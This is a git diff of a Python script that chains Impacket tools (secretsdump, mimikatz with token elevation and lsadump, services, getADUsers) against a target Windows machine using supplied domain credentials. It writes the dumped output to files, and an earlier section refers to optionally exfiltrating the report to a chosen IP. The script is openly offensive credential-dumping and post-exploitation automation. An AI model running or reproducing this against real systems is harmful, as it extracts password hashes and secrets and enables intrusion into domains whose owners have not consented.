@@ -21,7 +21,7 @@ validTargetIP = False
 secretsdump_path = './impacket/examples/secretsdump.py'
 mimikatz_path = './impacket/examples/mimikatz.py'
 services_path = './impacket/examples/services.py'
-getADUsers_path = '/impacket/examples/getADUsers.py'
+getADUsers_path = './impacket/examples/getADUsers.py'
 
 
 # Find out if the report should be exfiltrated
@@ -45,6 +45,7 @@ if exfilBool is True:
         except socket.error:
             exfilBool = input("The IP address entered was not valid, please try again.\n")
 
+# Get the IP of the target machine.
 while validTargetIP is False:
     targetIP = input("Enter the IP of the target system\n")
     try:
@@ -53,6 +54,8 @@ while validTargetIP is False:
     except socket.error:
         targetIP = input("The target IP you entered is not valid, please try again.\n")
 
+# Run the secretsdump script, saves to file
+# FIND A WAY TO CREATE FOLDER TO SAVE TO.
 secCommand = f"py {secretsdump_path} {domain}/{username}:{password}@{targetIP} >> c:\\temp\\secOutput.txt"
 
 try:
@@ -60,9 +63,16 @@ try:
 except KeyError as e:
     print(f"There was an error: {e}")
 
+# Run the mimikatz script, this uses command.txt which elevates the token and does a lsadump.
 mimiCommand = (f"py {mimikatz_path} -f ./command.txt "
                f"{domain}/{username}:{password}@{targetIP} >> c:\\temp\\mimiOutput.txt")
-
 os.system(mimiCommand)
 
+# Run services.py script.
+servicesCommand = (f"py {services_path} {domain}/{username}:{password}@{targetIP} >> c:\\temp\\servicesOutput.txt")
+os.system(servicesCommand)
+
+# Run ADUsers script.
+ADUsersCommand = (f"py {getADUsers_path} {domain}/{username}:{password}@{targetIP} >> c:\\temp\\ADUsersOutput.txt")
+os.system(ADUsersCommand)
 
